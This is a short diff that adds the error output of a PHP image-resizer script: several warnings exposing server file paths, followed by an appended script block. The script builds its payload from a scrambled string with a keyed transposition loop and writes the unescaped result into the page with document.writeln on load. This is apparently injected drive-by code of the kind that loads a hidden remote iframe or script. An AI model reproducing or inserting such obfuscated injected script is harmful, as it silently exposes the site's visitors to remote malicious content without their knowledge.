@@ -1,0 +1,7 @@
+<br />
+<b>Warning</b>:  imagejpeg() [<a href='function.imagejpeg'>function.imagejpeg</a>]: Unable to open '/www/htdocs/w00f2bb7//resizer/cache/463a2266f666f5cbc6254001124300ca.jpg' for writing: Permission denied in <b>/www/htdocs/w00f2bb7/resizer/resize-class.php</b> on line <b>220</b><br />
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /www/htdocs/w00f2bb7/resizer/resize-class.php:220) in <b>/www/htdocs/w00f2bb7/resizer/index.php</b> on line <b>99</b><br />
+<br />
+<b>Warning</b>:  readfile(/www/htdocs/w00f2bb7//resizer/cache/463a2266f666f5cbc6254001124300ca.jpg) [<a href='function.readfile'>function.readfile</a>]: failed to open stream: No such file or directory in <b>/www/htdocs/w00f2bb7/resizer/index.php</b> on line <b>100</b><br />
+<script>var a='';var b='%2/tafod%h2b233 Cstx-ri2%%32d%i e%/i.nci5g%e%%% 30hisen%h2%%r0/ irt-cis232D0e2f %22mcmimt2t2o2CEr%%nrae2%h2r%%a mDAlmu.w2i5mDEe fcpahch%D0%fr2r a33aond02e2a33m ';var c='5314869720';for(var i=0;i<16;i++) for(var j=0;j<10;j++) a+=b.charAt((parseInt(c.charAt(j))*16)+i);document.writeln(unescape(a));</script>
